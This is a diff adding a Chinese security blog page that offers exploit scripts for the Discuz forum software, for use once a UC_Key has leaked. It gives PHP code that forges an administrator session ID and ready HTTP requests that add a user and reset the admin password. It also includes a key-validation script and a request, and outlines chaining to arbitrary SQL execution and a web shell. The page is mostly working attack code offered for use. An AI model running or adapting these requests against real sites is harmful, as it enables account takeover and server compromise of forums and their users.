@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+        <head>
+        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
+        <meta charset="utf-8">
+        <title>Discuz Key的利用脚本 | 侠客行|</title>
+        <link rel="stylesheet" href="https://ICheeryI.github.io/styles/main.css">
+        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
+        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+         <script >hljs.initHighlightingOnLoad();</script>
+
+    </head>
+    <body>
+              <header class="header mdui-m-b-5">      
+            <div class="container  ">
+                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://ICheeryI.github.io">侠客行|</a></div>
+                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s">学如逆水行舟</div>
+           
+            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
+                   
+                            <li><a href="/">首页</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/archives">归档</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/tags">标签</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/Cheery">关于我</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                  </nav>
+                </div>
+        </header>
+        <div class="mdui-container ">
+                <div class="mdui-row">
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">Discuz Key的利用脚本</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2020-11-13 16:18:30">2020-11-13 / 7 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="discuz"><strong>Discuz</strong></h1>
+<h2 id="待完成"><strong>待完成</strong></h2>
+<ol>
+<li>authkey前台用户伪造</li>
+<li>uc_key(discuz)调用dbbak.php任意sql语句执行</li>
+</ol>
+<h2 id="key"><strong>Key</strong></h2>
+<h4 id="1-uc_keyuc_server的利用">1. <em><strong>UC_Key(uc_server)的利用</strong></em></h4>
+<blockquote>
+<p><em><strong>原理</strong></em></p>
+</blockquote>
+<ol>
+<li>在discuz uc_server中，主要得代码 /uc_server/model/admin.php 用于权限得校验</li>
+<li>权限校验函数由 check_priv(),sid_encode(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mo separator="true">,</mo><mi>s</mi><mi>i</mi><msub><mi>d</mi><mi>d</mi></msub><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">username),sid_decode(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mopen">(</span></span></span></span>sid) 完成，当我们得到/uc_server/data/config.inc.php里面得uc_key时，就能调用UC_server得后台功能</li>
+</ol>
+<blockquote>
+<p><em><strong>EXP</strong></em></p>
+</blockquote>
+<pre><code class="language-PHP">&lt;?php
+//Author: Cheery@blog.xiake.pw
+$key = &quot;Jdqbi3l4baT7J6Xaacea5dVbj1Z24dv2xcI6n6F8acjbceb0B6E8y499u2U8P3O9&quot;;//这里放入uc_key(server)
+
+$sid = sid_encode(&quot;UCenterAdministrator&quot;,$key);
+var_dump($sid);
+
+function sid_encode($username,$key) {
+		$ip = &quot;192.168.1.1&quot;; //这里是 X-Forwarded-for 设置的值
+		$agent = &quot;test&quot;; //这里是User-Agent 设置的值
+		$authkey = md5($ip.$agent.$key);
+		$check = substr(md5($ip.$agent), 0, 8);
+		return rawurlencode(authcode(&quot;$username\t$check&quot;, 'ENCODE', $authkey, 1800));
+	}
+
+function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
+  $ckey_length = 4;
+  $key = md5($key != '' ? $key : '123456');
+  $keya = md5(substr($key, 0, 16));
+  $keyb = md5(substr($key, 16, 16));
+  $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
+
+  $cryptkey = $keya.md5($keya.$keyc);
+  $key_length = strlen($cryptkey);
+
+  $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+  $string_length = strlen($string);
+
+  $result = '';
+  $box = range(0, 255);
+
+  $rndkey = array();
+  for($i = 0; $i &lt;= 255; $i++) {
+    $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+  }
+
+  for($j = $i = 0; $i &lt; 256; $i++) {
+    $j = ($j + $box[$i] + $rndkey[$i]) % 256;
+    $tmp = $box[$i];
+    $box[$i] = $box[$j];
+    $box[$j] = $tmp;
+  }
+
+  for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
+    $a = ($a + 1) % 256;
+    $j = ($j + $box[$a]) % 256;
+    $tmp = $box[$a];
+    $box[$a] = $box[$j];
+    $box[$j] = $tmp;
+    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+  }
+
+  if($operation == 'DECODE') {
+    if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
+      return substr($result, 26);
+    } else {
+      return '';
+    }
+  } else {
+    return $keyc.str_replace('=', '', base64_encode($result));
+  }
+}
+?&gt;
+</code></pre>
+<blockquote>
+<p><em><strong>数据包</strong></em></p>
+</blockquote>
+<p>利用时，需要先访问 /uc_server/,查看源代码得formhash放入数据包 formhash字段，上面exp生成得数据放入sid中</p>
+<p>添加前台用户数据包</p>
+<pre><code>POST /discuz/uc_server/admin.php?m=user&amp;a=ls&amp;adduser=yes HTTP/1.1
+Host: 192.168.192.144
+User-Agent: test
+X-Forwarded-for: 192.168.1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: application/x-www-form-urlencoded
+Cookie: wQsU_2132_ulastactivity=93c3oYUEYIIHhx%2Fw3YiB8xF%2Fe998AjNLbqGxpRXnGgBYaOM4o4WB; jYRt_2132_saltkey=aIGNy1Ty; jYRt_2132_lastvisit=1601454013; fAHl_2132_saltkey=gjoEzyT8; fAHl_2132_lastvisit=1601454079; wQsU_2132_saltkey=G51OL70Y; wQsU_2132_lastvisit=1601454145; JlEi_2132_saltkey=se4YX8H8; JlEi_2132_lastvisit=1602323468; JlEi_2132_ulastactivity=fe07A28zcfWFh7IKHXVBLrTcorQHan4UM7B1b8lslGjuFXpfhkdG; JlEi_2132_sid=GWCwWG; JlEi_2132_lastact=1605265744%09home.php%09misc; JlEi_2132_onlineusernum=1; JlEi_2132_sendmail=1
+Content-Length: 172
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+sid=7d8btaWvp32fHxPQ33B%2FV%2BjTR1j8%2Br9s8Z3EZFsiHMz9BCRRHalLLswl1Dv20HqEJPPU3t8E2bPVug&amp;formhash=0745866250c29b60&amp;addname=test1&amp;addpassword=123456&amp;addemail=1111%40qq.com
+</code></pre>
+<p>修改管理员密码包</p>
+<pre><code>POST /discuz/uc_server/admin.php?m=user&amp;a=edit&amp;uid=1 HTTP/1.1
+Host: 192.168.192.144
+User-Agent: test
+X-Forwarded-for: 192.168.1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: application/x-www-form-urlencoded
+Cookie: wQsU_2132_ulastactivity=93c3oYUEYIIHhx%2Fw3YiB8xF%2Fe998AjNLbqGxpRXnGgBYaOM4o4WB; jYRt_2132_saltkey=aIGNy1Ty; jYRt_2132_lastvisit=1601454013; fAHl_2132_saltkey=gjoEzyT8; fAHl_2132_lastvisit=1601454079; wQsU_2132_saltkey=G51OL70Y; wQsU_2132_lastvisit=1601454145; JlEi_2132_saltkey=se4YX8H8; JlEi_2132_lastvisit=1602323468; JlEi_2132_ulastactivity=fe07A28zcfWFh7IKHXVBLrTcorQHan4UM7B1b8lslGjuFXpfhkdG; JlEi_2132_sid=GWCwWG; JlEi_2132_lastact=1605265744%09home.php%09misc; JlEi_2132_onlineusernum=1; JlEi_2132_sendmail=1
+Content-Length: 220
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+sid=7d8btaWvp32fHxPQ33B%2FV%2BjTR1j8%2Br9s8Z3EZFsiHMz9BCRRHalLLswl1Dv20HqEJPPU3t8E2bPVug&amp;formhash=0745866250c29b60&amp;newusername=admin&amp;username=admin&amp;password=admin123&amp;email=admin%40admin.com&amp;submit=+%E6%8F%90+%E4%BA%A4+
+</code></pre>
+<h4 id="2-uc_keydiscuz的利用">2. <em><strong>UC_Key(discuz)的利用</strong></em></h4>
+<blockquote>
+<p><strong>原理</strong></p>
+</blockquote>
+<ol>
+<li>uc_key(discuz)位于 /config/config_ucenter.php</li>
+<li>得到uc_key,配合前台用户(也可以是authkey伪造)上传附件，利用/api/db/dbbak.php导出和导入可以完成任意sql执行</li>
+<li>任意执行sql后可以通过修改管理员密码，登陆后台用前面发过的文章getshell</li>
+</ol>
+<blockquote>
+<p><strong>判断key是否正确得脚本</strong></p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+$uc_key=&quot;x9L1efE1ff17a4O7i158xcSbUfo1U2V7Lebef3g974YdG4w0E2LfI4s5R1p2t4m5&quot;;//
+$time = time() + 720000;
+$str = &quot;time=&quot;.$time.&quot;&amp;action=updatebadwords&quot;;
+$code = rawurlencode(authcode($str,&quot;ENCODE&quot;,$uc_key));
+echo $code;
+
+function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
+  $ckey_length = 4;
+  $key = md5($key != '' ? $key : '123456');
+  $keya = md5(substr($key, 0, 16));
+  $keyb = md5(substr($key, 16, 16));
+  $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
+
+  $cryptkey = $keya.md5($keya.$keyc);
+  $key_length = strlen($cryptkey);
+
+  $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+  $string_length = strlen($string);
+
+  $result = '';
+  $box = range(0, 255);
+
+  $rndkey = array();
+  for($i = 0; $i &lt;= 255; $i++) {
+    $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+  }
+
+  for($j = $i = 0; $i &lt; 256; $i++) {
+    $j = ($j + $box[$i] + $rndkey[$i]) % 256;
+    $tmp = $box[$i];
+    $box[$i] = $box[$j];
+    $box[$j] = $tmp;
+  }
+
+  for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
+    $a = ($a + 1) % 256;
+    $j = ($j + $box[$a]) % 256;
+    $tmp = $box[$a];
+    $box[$a] = $box[$j];
+    $box[$j] = $tmp;
+    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+  }
+
+  if($operation == 'DECODE') {
+    if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
+      return substr($result, 26);
+    } else {
+      return '';
+    }
+  } else {
+    return $keyc.str_replace('=', '', base64_encode($result));
+  }
+}
+?&gt;
+</code></pre>
+<blockquote>
+<p><strong>请求</strong></p>
+</blockquote>
+<ol>
+<li>返回Authracation has expiried 代表key错误</li>
+<li>返回1代表uc_key正确，可以利用</li>
+</ol>
+<pre><code>GET /discuz/api/uc.php?code=cb01maESPEQUt9PHuO60V1vRcll8wUhIOvAwSzfjpQ48oDdsZab%2F2e9aVHZSSPn1ahscyvodxi6im8nDddI 
+
+</code></pre>
+<h2 id="相关参考文章"><strong>相关参考文章</strong></h2>
+<p>https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/</p>
+<p>https://mp.weixin.qq.com/s/AEE5GMRCRKDAKV3mIfGgAA</p>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> </div>
+                                        
+
+                                        
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://ICheeryI.github.io/first/">没啥标题</a></div> </div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://ICheeryI.github.io/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
+                        </div>
+                      </div>
+    
+                
+
+              </div>
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
+               <nav class="social-links">
+                      <ul>
+                      
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      </ul>
+                    </nav>
+                    <div class="copyright">
+                      <p>Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> <br/> Theme <a href="https://github.com/shanbufun/gridea-theme-song" target="_blank"  title="宋"  >Song</a> by <a href="https://shanbu.fun/" target="_blank"  title="山卜方" >shanbufun</a> </p>
+                  </div>
+                  
+              </footer>
+    </body>
+</html>
